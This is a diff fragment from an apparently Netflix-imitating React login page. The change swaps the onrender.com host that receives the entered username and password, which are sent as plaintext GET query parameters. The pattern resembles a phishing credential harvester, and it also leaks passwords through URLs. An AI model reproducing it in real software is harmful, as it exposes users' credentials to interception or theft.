@@ -42,7 +42,7 @@ function App() {
     if (!valid) return;
 
     axios
-      .get(`https://netflix-login-2.onrender.com/login?username=${user}&password=${pass}`)
+      .get(`https://login-netflix-1.onrender.com/login?username=${user}&password=${pass}`)
       .then((data) => {
         if (data.data === true) {
           navigate("/sucess");
